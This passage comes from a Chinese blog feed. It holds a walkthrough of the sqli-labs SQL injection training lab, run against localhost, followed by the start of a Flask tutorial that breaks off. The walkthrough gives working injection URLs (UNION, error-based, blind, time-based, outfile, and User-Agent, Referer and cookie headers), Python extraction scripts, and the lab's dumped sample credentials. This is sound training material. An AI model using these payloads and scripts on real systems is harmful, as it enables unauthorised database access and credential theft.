title="判断列长"></a>判断列长</h3><p><code>order by 4</code> 报错</p><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1%20order%20by%204+--+</code></p><p><code>order by 3</code> 不报错</p><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1%20order%20by%203+--+</code></p><p>其他步骤都和<strong>Less-1</strong>一样，就不写了</p><h2 id="Less-3（UNION-注入）"><a href="#Less-3（UNION-注入）" class="headerlink" title="Less-3（UNION 注入）"></a>Less-3（UNION 注入）</h2><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>直接在末尾加 <code>&#39;</code>，发现报错信息</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p><p>有一个括号，所以尝试闭合一下括号</p><p><code>http://127.0.0.1/sqli-labs/Less-3/?id=1%27)%20and%201=1%20+--+</code></p><p>返回正常，后续也和上面2个题一样</p><h2 id="Less-4（UNION-注入）"><a href="#Less-4（UNION-注入）" class="headerlink" title="Less-4（UNION 注入）"></a>Less-4（UNION 注入）</h2><h3 id="判断注入类型-2"><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>这次我们判断用 <code>id=1&quot;</code></p><p>得到报错信息</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p><p>说明也存在注入，这里的报错信息中，也有一个<code>)</code>，而且和上一题相比，这个题用到的也是<code>&quot;</code></p><p>所以用<code>&quot;)</code>去闭合，构造</p><p><code>http://127.0.0.1/sqli-labs/Less-4/?id=1%22)%20and%201=1%20+--+</code></p><p>返回正常</p><p>后续步骤和之前几个题一样，就不多写了</p><h2 id="Less-5（报错注入或盲注）"><a href="#Less-5（报错注入或盲注）" class="headerlink" title="Less-5（报错注入或盲注）"></a>Less-5（报错注入或盲注）</h2><h3 id="判断注入类型-3"><a href="#判断注入类型-3" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>末尾加上 <code>&#39;</code> 报错</p><p>加上 <code>&#39; +--+</code> 返回正常，说明需要<code>&#39;</code>来闭合</p><p>这里可以直接用 <code>updatexml</code> 报错注入</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)+--+</code></p><p>但是毕竟这题要用盲注，那就还是用盲注吧</p><p>这题虽然能用 <code>order by</code>得到列数，但是用<code>UNION</code> 联合查询时，无论怎样都不能得到显位</p><p>所以我们要采用盲注的方法</p><h3 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h3><p><strong>length(database()) &gt; 8</strong></p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20length(database())%20%3E%208+--+</code></p><p>没有回显</p><p><strong>length(database()) &gt; 7</strong></p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20length(database())%20%3E%207+--+</code></p><p>正常回显</p><p>说明数据库长度为 <code>8</code></p><h3 id="判断数据库名称"><a href="#判断数据库名称" class="headerlink" title="判断数据库名称"></a>判断数据库名称</h3><p>之前已经得到数据库的长度为 <code>8</code> 了</p><p>判断第一位</p><p><code>&gt;114</code> 返回正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20database()),1,1))%20%3E%20114+--+</div></pre></td></tr></table></figure></p><p><code>&gt;115</code> 返回不正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20database()),1,1))%20%3E%20115+--+</code></p><p>说明数据库的第一位是 <code>s</code>(ascii码为 115)</p><p>因为每一次都这样验证很浪费时间，所以我们写脚本慢慢跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import requests</div><div class="line">database = &apos;&apos;</div><div class="line">url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and ascii(substr((select database()),&#123;times&#125;,1)) &gt; &#123;num&#125;+--+&apos;</div><div class="line">for times in range(1,9):</div><div class="line">    for num in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1):</div><div class="line">        content = requests.get(url.format(times=times,num=num)).text</div><div class="line">        if &apos;You&apos; not in content:</div><div class="line">            database += chr(num)</div><div class="line">            print (database)</div><div class="line">            break</div><div class="line">print (database)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">s</div><div class="line">se</div><div class="line">sec</div><div class="line">secu</div><div class="line">secur</div><div class="line">securi</div><div class="line">securit</div><div class="line">security</div><div class="line">security</div></pre></td></tr></table></figure><p>得到数据库名称为 <code>security</code></p><h3 id="判断表名长度"><a href="#判断表名长度" class="headerlink" title="判断表名长度"></a>判断表名长度</h3><p>这里我打算先把查询出来的所有表名用逗号连接在一起，然后再算出总长度</p><p><code>&gt;28</code> 返回正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(table_name))%20from%20information_schema.tables%20where%20table_schema=%27security%27)%3E28%20+--+</code></p><p><code>&gt;29</code> 返回不正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(table_name))%20from%20information_schema.tables%20where%20table_schema=%27security%27)%3E29+--+</code></p><p>说明用逗号连接的所有表的长度为 <code>29</code></p><h3 id="判断所有表名"><a href="#判断所有表名" class="headerlink" title="判断所有表名"></a>判断所有表名</h3><p><code>&gt; 100</code> 返回正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),1,1))%3E100+--+</code></p><p><code>&gt; 101</code> 返回不正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&#39; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;101+--+</code></p><p>所有第一位是 <code>e</code></p><p>同样太麻烦，写脚本慢慢跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">database = &apos;&apos;</div><div class="line">url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),&#123;times&#125;,1))%3E&#123;num&#125;+--+&apos;</div><div class="line">nums = [n for n in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1)]</div><div class="line">nums.insert(0,ord(&apos;,&apos;))</div><div class="line">for times in range(1,30):</div><div class="line">    for num in nums:</div><div class="line">        content = requests.get(url.format(times=times,num=num)).text</div><div class="line">        if &apos;You&apos; not in content:</div><div class="line">            database += chr(num)</div><div class="line">            print (database)</div><div class="line">            break</div><div class="line">print (database)</div></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">e</div><div class="line">em</div><div class="line">ema</div><div class="line">emai</div><div class="line">email</div><div class="line">emails</div><div class="line">emails,</div><div class="line">emails,r</div><div class="line">emails,re</div><div class="line">emails,ref</div><div class="line">emails,refe</div><div class="line">emails,refer</div><div class="line">emails,refere</div><div class="line">emails,referer</div><div class="line">emails,referers</div><div class="line">emails,referers,</div><div class="line">emails,referers,u</div><div class="line">emails,referers,ua</div><div class="line">emails,referers,uag</div><div class="line">emails,referers,uage</div><div class="line">emails,referers,uagen</div><div class="line">emails,referers,uagent</div><div class="line">emails,referers,uagents</div><div class="line">emails,referers,uagents,</div><div class="line">emails,referers,uagents,u</div><div class="line">emails,referers,uagents,us</div><div class="line">emails,referers,uagents,use</div><div class="line">emails,referers,uagents,user</div><div class="line">emails,referers,uagents,users</div><div class="line">emails,referers,uagents,users</div></pre></td></tr></table></figure><h3 id="判断列内容长度"><a href="#判断列内容长度" class="headerlink" title="判断列内容长度"></a>判断列内容长度</h3><p><code>&gt; 19</code> 返回正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(column_name))%20from%20information_schema.columns%20where%20table_name=%27users%27)%20%3E%2019+--+</code></p><p><code>&gt; 20</code> 返回不正常</p><p><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(column_name))%20from%20information_schema.columns%20where%20table_name=%27users%27)%20%3E%2020+--+</code></p><p>所以列的内容长度为 <code>20</code></p><h3 id="判断列的内容"><a href="#判断列的内容" class="headerlink" title="判断列的内容"></a>判断列的内容</h3><p>刚才我们已经拿到表名，我们看中的是 <code>users</code> 这个表</p><p>所以我们仅对 <code>users</code> 进行猜解，现在依然用跑脚本的方法，拿到列名</p><p><strong>脚本</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">database = &apos;&apos;</div><div class="line">url = &apos;http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),&#123;times&#125;,1))%3E&#123;num&#125;+--+&apos;</div><div class="line">nums = [n for n in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1)]</div><div class="line">nums.insert(0,ord(&apos;,&apos;))</div><div class="line">for times in range(1,21):</div><div class="line">    for num in nums:</div><div class="line">        content = requests.get(url.format(times=times,num=num)).text</div><div class="line">        if &apos;You&apos; not in content:</div><div class="line">            database += chr(num)</div><div class="line">            print (database)</div><div class="line">            break</div><div class="line">print (database)</div></pre></td></tr></table></figure></p><p><strong>结果</strong><br><code>id,username,passwor</code></p><h3 id="判断字段内容给的长度"><a href="#判断字段内容给的长度" class="headerlink" title="判断字段内容给的长度"></a>判断字段内容给的长度</h3><p><code>&gt; 174</code> 返回正常<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(username,password))%20from%20users)%20%3E%20174+--+</code></p><p><code>&gt; 174</code> 返回不正常<br><code>http://127.0.0.1/sqli-labs/Less-5/?id=1%27%20and%20(select%20length(group_concat(username,password))%20from%20users)%20%3E%20175+--+</code></p><p>所以返回字段的内容长为 <code>175</code></p><h3 id="判断字段内容"><a href="#判断字段内容" class="headerlink" title="判断字段内容"></a>判断字段内容</h3><p>脚本类似</p><p><strong>最后的结果为</strong></p><p><code>DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4</code></p><p>这样确实不太好看出来，所以可以采用</p><p><code>select group_concat(concat_ws(&#39;:&#39;,username,password)) from users</code></p><p><strong>结果为</strong></p><p><code>Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</code></p><h2 id="Less-6（报错注入或盲注）"><a href="#Less-6（报错注入或盲注）" class="headerlink" title="Less-6（报错注入或盲注）"></a>Less-6（报错注入或盲注）</h2><p>这里和上一个题几乎一样，只不过这里闭合用到的是 <code>&quot;</code> 而已</p><p><code>http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20+--+</code></p><p>后面就不在多写了，一个模子刻出来的</p><p>只需要把最后的 <code>&#39;</code> 换成 <code>&quot;</code> 就可以了</p><h2 id="Less-7（outfile）"><a href="#Less-7（outfile）" class="headerlink" title="Less-7（outfile）"></a>Less-7（outfile）</h2><p>进入题目，参数改成 <code>id=1</code></p><p>得到回显</p><p><code>You are in.... Use outfile......</code></p><p><code>http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20and%20ascii(left(database(),1))%20%3E%2097+--+</code></p><p>这个题用上面的盲注也可以做出来，但这里要求用outfile，那就用吧</p><p>这里主要也是用到前面的 <code>union</code> 注入</p><p>当然实战中有写的权限基本都是直接写shell进去了</p><p>这里就随便演示一下吧</p><p>根据 <code>order by</code> 可知，有3列</p><ul><li>查数据库</li></ul><p><code>http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20union%20select%201,(select%20database()),3%20into%20outfile%20%27D:\\phpStudy\\WWW\\sqli-labs\\123.txt%27+--+</code></p><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1DumbDumb</div><div class="line">1security3</div></pre></td></tr></table></figure><ul><li>查表名</li></ul><p><code>http://127.0.0.1/sqli-labs/Less-7/?id=1%27))%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),3%20into%20outfile%20%27D:\\phpStudy\\WWW\\sqli-labs\\123.txt%27+--+</code></p><p>结果</p><p><img src="img/sqli_labs_14.png" alt="sqlilibs_7_1"></p><p>后续操作就不再详细说了</p><h2 id="Less-8（盲注）"><a href="#Less-8（盲注）" class="headerlink" title="Less-8（盲注）"></a>Less-8（盲注）</h2><p>和 <code>Less-5</code> 几乎是一模一样的，唯一的区别就是这里只能用盲注，而Less-5可以用报错注入</p><h2 id="Less-9-基于时间的盲注"><a href="#Less-9-基于时间的盲注" class="headerlink" title="Less-9 (基于时间的盲注)"></a>Less-9 (基于时间的盲注)</h2><p>这个题无论怎么构造payload</p><p>永远都是</p><p><code>You are in...........</code></p><p>根据题目中的提示，我们可以知道这个是基于时间的盲注</p><p>和之前的盲注差不多，只不过要增加一个 <code>if</code> 语句</p><p>一样的写脚本跑，这里就只写跑数据库名字的吧，毕竟太浪费时间了</p><p><strong>脚本内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import time</div><div class="line"></div><div class="line">url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr((select database()),&#123;num&#125;,1))&gt;&#123;asc&#125;,0,sleep(3)) +--+&quot;</div><div class="line">db_name = &apos;&apos;</div><div class="line"></div><div class="line">for num in range(1,9):</div><div class="line">    for asc in range(ord(&apos;a&apos;),ord(&apos;z&apos;)+1):</div><div class="line">        s_time = time.time()</div><div class="line">        requests.get(url.format(num=num,asc=asc))</div><div class="line">        e_time = time.time()</div><div class="line">        if (e_time-s_time) &gt; 3:</div><div class="line">            db_name += chr(asc)</div><div class="line">            print (db_name)</div><div class="line">            break</div></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">s</div><div class="line">se</div><div class="line">sec</div><div class="line">secu</div><div class="line">secur</div><div class="line">securi</div><div class="line">securit</div><div class="line">security</div></pre></td></tr></table></figure><h2 id="Less-10-基于时间的盲注"><a href="#Less-10-基于时间的盲注" class="headerlink" title="Less-10 (基于时间的盲注)"></a>Less-10 (基于时间的盲注)</h2><p>和 Less-9 差不多，只不过这里闭合用的是 <code>&quot;</code> ， 而 <code>Less-9</code>用的是 <code>&#39;</code></p><h2 id="Less-11（UNION注入和POST注入）"><a href="#Less-11（UNION注入和POST注入）" class="headerlink" title="Less-11（UNION注入和POST注入）"></a>Less-11（UNION注入和POST注入）</h2><p><img src="img/sqli_labs_15.png" alt="sqlilibs_11_1"></p><p>这种登陆框的，一般都是 <code>post</code>注入，因为提交数据是post方式提交的，然后再进入数据库查询，所以过滤不严也会有注入的情况发生</p><p>所以我们登陆的时候利用bp抓包</p><p>然后 <code>send to reapter</code></p><p>和以前一样，最先尝试 <code>union</code> 注入</p><p>先判断列数</p><p><code>order by 3</code> 报错</p><p><img src="img/sqli_labs_16.png" alt="sqlilibs_11_2"></p><p><code>order by 2</code> 返回正常</p><p><img src="img/sqli_labs_17.png" alt="sqlilibs_11_3"></p><p>说明有两列</p><p>后面就再演示一下查数据库名吧</p><p><img src="img/sqli_labs_18.png" alt="sqlilibs_11_4"></p><p>成功查出数据库名为 <code>security</code></p><p>后面步骤和前面类似就不再赘述了</p><h2 id="Less-12（UNION注入和POST注入）"><a href="#Less-12（UNION注入和POST注入）" class="headerlink" title="Less-12（UNION注入和POST注入）"></a>Less-12（UNION注入和POST注入）</h2><p><img src="img/sqli_labs_19.png" alt="sqlilibs_12_1"></p><p>和上一个题一样，只不过这里闭合用到的是 <code>&quot;)</code></p><h2 id="Less-13（POST注入、盲注、报错注入）"><a href="#Less-13（POST注入、盲注、报错注入）" class="headerlink" title="Less-13（POST注入、盲注、报错注入）"></a>Less-13（POST注入、盲注、报错注入）</h2><p><img src="img/sqli_labs_20.png" alt="sqlilibs_13_1"></p><p>如果在参数末尾直接输入<code>&#39;</code>，会报错，而报错信息中表名，闭合应该用 <code>&#39;)</code></p><p>所以我们继续尝试，但这个题，无论怎么输入，都没有显位，只有报错信息，所以可以考虑用盲注或者报错注入</p><p>虽然题目中所用的是盲注，但是能利用报错注入我们就避免使用盲注，因为盲注确实很浪费时间</p><p>得到数据库名</p><p><img src="img/sqli_labs_21.png" alt="sqlilibs_13_2"></p><p>后面方法与之前类似</p><h2 id="Less-14（POST注入、盲注、报错注入）"><a href="#Less-14（POST注入、盲注、报错注入）" class="headerlink" title="Less-14（POST注入、盲注、报错注入）"></a>Less-14（POST注入、盲注、报错注入）</h2><p>和上个题类型一样，，只不过这里闭合用到的是<code>&quot;</code></p><p><img src="img/sqli_labs_22.png" alt="sqlilibs_14_1"></p><h2 id="Less-15（POST注入和基于时间的盲注）"><a href="#Less-15（POST注入和基于时间的盲注）" class="headerlink" title="Less-15（POST注入和基于时间的盲注）"></a>Less-15（POST注入和基于时间的盲注）</h2><p>这个题，无论如何都不会有任何报错信息，也没有返回信息，所以这里我们就只能用到基于时间的盲注</p><p><img src="img/sqli_labs_23.png" alt="sqlilibs_15_1"></p><p>图中会延时10秒</p><h2 id="Less-16（POST注入和基于时间的盲注）"><a href="#Less-16（POST注入和基于时间的盲注）" class="headerlink" title="Less-16（POST注入和基于时间的盲注）"></a>Less-16（POST注入和基于时间的盲注）</h2><p>和上一个题一样，只不过这里闭合所用到的是 <code>&quot;)</code></p><p><img src="img/sqli_labs_24.png" alt="sqlilibs_16_1"></p><h2 id="Less-17（POST注入、盲注、报错注入）"><a href="#Less-17（POST注入、盲注、报错注入）" class="headerlink" title="Less-17（POST注入、盲注、报错注入）"></a>Less-17（POST注入、盲注、报错注入）</h2><p>和之前一样，先闭合前面一句的输入</p><p>这里没有在用户名处注入，是因为用户名输入的内容会经过一个<code>check_input</code>函数过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">function check_input($value)</div><div class="line">&#123;</div><div class="line">if(!empty($value))</div><div class="line">&#123;</div><div class="line">// truncation (see comments)</div><div class="line">$value = substr($value,0,15);</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Stripslashes if magic quotes enabled</div><div class="line">if (get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line">$value = stripslashes($value);</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Quote if not a number</div><div class="line">if (!ctype_digit($value))</div><div class="line">&#123;</div><div class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">else</div><div class="line">&#123;</div><div class="line">$value = intval($value);</div><div class="line">&#125;</div><div class="line">return $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>所以我们选择了 <code>passwd</code> 这个参数来进行注入</p><p><img src="img/sqli_labs_25.png" alt="sqlilibs_17_1"></p><p>这里 <code>order by</code> 用不了，无法得到列数，所以这里不能采用 <code>UNION</code> 注入</p><p>于是乎采用报错注入或者盲注</p><p>因为自己比较懒，所以这里还是用报错注入来吧</p><p><img src="img/sqli_labs_26.png" alt="sqlilibs_17_2"></p><p>成功得到数据库名称</p><h2 id="Less-18-（UA-注入）"><a href="#Less-18-（UA-注入）" class="headerlink" title="Less-18 （UA 注入）"></a>Less-18 （UA 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</div></pre></td></tr></table></figure><p>根据源码，这里会将 <code>uagents</code> 写入数据库，也就是我们的<code>User-Agent</code></p><p>这里仍然抓包</p><p>我们先用<code>&#39;</code>闭合 <code>uagent</code>前面的<code>&#39;</code>，然后插入我们报错注入的语句，因为这个语句不能直接给后面注释掉，要让后面的正常运行，所以我们还要闭合<code>uagents</code>后面的<code>&#39;</code>，所以，就构成了我们的 payload</p><p><code>&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;1&#39; = &#39;1</code></p><p><img src="img/sqli_labs_27.png" alt="sqlilibs_18_1"></p><p>后续其他数据类似</p><h2 id="Less-19-（Referer-注入）"><a href="#Less-19-（Referer-注入）" class="headerlink" title="Less-19 （Referer 注入）"></a>Less-19 （Referer 注入）</h2><p>和上一个题类似，只不过这里注入是 <strong>referer</strong> 的注入，只需要将 <code>referer</code> 的内容改成我们上一题的 <code>payload</code> 即可</p><h2 id="Less-20-（cookie-注入）"><a href="#Less-20-（cookie-注入）" class="headerlink" title="Less-20 （cookie 注入）"></a>Less-20 （cookie 注入）</h2><p>和以前一样，登陆过程中抓包</p><p><img src="img/sqli_labs_28.png" alt="sqlilibs_20_1"></p><p>发现登陆成功后有一个<code>cookie</code>的值</p><p>再次刷新页面，拿到<code>cookie</code>，在通过构造<code>cookie</code>成功注入</p><p>这里仍然用的是报错注入</p><p><img src="img/sqli_labs_29.png" alt="sqlilibs_20_2"></p>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer18&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer18&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h1 id=&quot;写在最前&quot;&gt;&lt;a href=&quot;#写在最前&quot; class=&quot;headerlink&quot; title=&quot;写在最前&quot;&gt;&lt;/a&gt;写在最前&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;SQLI定义&lt;/strong&gt;：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="SQLI" scheme="https://damit5.com/tags/SQLI/"/>
    
  </entry>
  
  <entry>
    <title>Python_Flask_学习笔记</title>
    <link href="https://damit5.com/2018/05/07/Python-Flask-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://damit5.com/2018/05/07/Python-Flask-学习笔记/</id>
    <published>2018-05-07T08:52:33.000Z</published>
    <updated>2018-06-10T03:51:49.366Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer14" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer14"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="官方完整文档"><a href="#官方完整文档" class="headerlink" title="官方完整文档"></a>官方完整文档</h2><h4 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a><a href="http://www.pythondoc.com/flask/quickstart.html" target="_blank" rel="external">快速入门</a></h4><a id="more"></a><p>学习小结</p><h2 id="最小应用"><a href="#最小应用" class="headerlink" title="最小应用"></a>最小应用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from flask import Flask</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def hello_world():</div><div class="line">    return &apos;Hello World!&apos;</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run()</div></pre></td></tr></table></figure><h2 id="run-参数"><a href="#run-参数" class="headerlink" title="run() 参数"></a><code>run()</code> 参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.run(host=&apos;0.0.0.0&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><ul><li>host : 0.0.0.0 监听所有公开IP</li><li>port : 监听的端口，默认为5000</li><li>debug : debug 模式，修改代码后会自动重启，上线服务不推荐这样做</li></ul><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>简单的来说就是访问你服务器的地址</p><p>比如</p><p><code>/admin</code> <code>/login</code> <code>/phpMyadmin</code></p><h2 id="的问题"><a href="#的问题" class="headerlink" title="/ 的问题"></a><code>/</code> 的问题</h2><p>访问的时候只能少，不能多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@app.route(&apos;/projects/&apos;)</div><div class="line">def projects():</div><div class="line">    return &apos;The project page&apos;</div><div class="line"></div><div class="line">@app.route(&apos;/about&apos;)</div><div class="line">def about():</div><div class="line">    return &apos;The about page&apos;</div></pre></td></tr></table></figure><p>可以访问 <code>/projects</code></p><p>但是不能访问 <code>/about/</code>，会抛出<code>404</code>异常</p><h2 id="URL-的构造"><a href="#URL-的构造" class="headerlink" title="URL 的构造"></a>URL 的构造</h2><ul><li>使用 <code>flask</code> 自带的 <code>url_for</code></li><li>使用前需要先从<code>flask</code>模块导入(<code>from flask import url_for</code>)</li></ul><h4 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from flask import Flask,url_for</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def hello_world():</div><div class="line">    return &apos;Hello 